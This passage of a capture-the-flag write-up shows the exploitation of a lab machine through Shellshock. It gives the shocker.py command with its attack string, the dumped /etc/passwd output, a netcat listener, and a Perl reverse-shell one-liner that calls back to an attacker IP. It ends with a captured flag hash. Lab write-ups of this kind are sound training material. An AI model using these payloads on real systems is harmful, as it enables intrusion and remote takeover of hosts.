### Shellshock

```bash
python2 shocker.py -H $ip --command "/bin/cat /etc/passwd" -c /cgi-bin/user.sh --verbose
```

```bash
[+] Single target '/cgi-bin/user.sh' being used
[+] Checking connectivity with target...
[I] Checking to see if 10.10.10.56 resolves...
[I] Resolved ok
[I] Checking to see if 10.10.10.56 is reachable on port 80...
[I] 10.10.10.56 seems reachable...
[+] Target was reachable
[+] Looking for vulnerabilities on 10.10.10.56:80
[I] Starting thread 1
[+] Finished host scan
[+] 1 potential target found, attempting exploits
[+] Trying exploit for http://10.10.10.56:80/cgi-bin/user.sh
[I] Flag set to: URX7FDHT9JYCI17YIPWI
[I] Header is: Content-type
[I] Attack string is: () { :;}; echo;  echo URX7FDHT9JYCI17YIPWI; /bin/cat /etc/passwd
[!] http://10.10.10.56:80/cgi-bin/user.sh looks vulnerable
[!] Response returned was:
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  bin:x:2:2:bin:/bin:/usr/sbin/nologin
  sys:x:3:3:sys:/dev:/usr/sbin/nologin
  sync:x:4:65534:sync:/bin:/bin/sync
  games:x:5:60:games:/usr/games:/usr/sbin/nologin
  man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
  lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
  mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
  news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
  uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
  proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
  backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
  list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
  irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
  gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
  nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
  systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
  systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
  systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
  systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
  syslog:x:104:108::/home/syslog:/bin/false
  _apt:x:105:65534::/nonexistent:/bin/false
  lxd:x:106:65534::/var/lib/lxd/:/bin/false
  messagebus:x:107:111::/var/run/dbus:/bin/false
  uuidd:x:108:112::/run/uuidd:/bin/false
  dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
  sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
  shelly:x:1000:1000:shelly,,,:/home/shelly:/bin/bash
```



### Reverse Shell

We are prompted to continue exploiting the url, select 1 and enter.


Start our listener on our attacker machine:

```bash
nc -lvnp 4321
```

Now we can enter our reverse shell payload in our shellshock prompt:

```bash
/usr/bin/perl -e 'use Socket;$i=\"10.10.14.12\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"sh -i\");};'
```

![[shell1-payload.png]]

Checking out listener, we now have a low-privileged shell:

![[pop-shelly-shell.png]]

Getting local.txt 

![[local.txt-contents.png]]

```txt
2ec24e11320026d1e70ff3e16695b233
```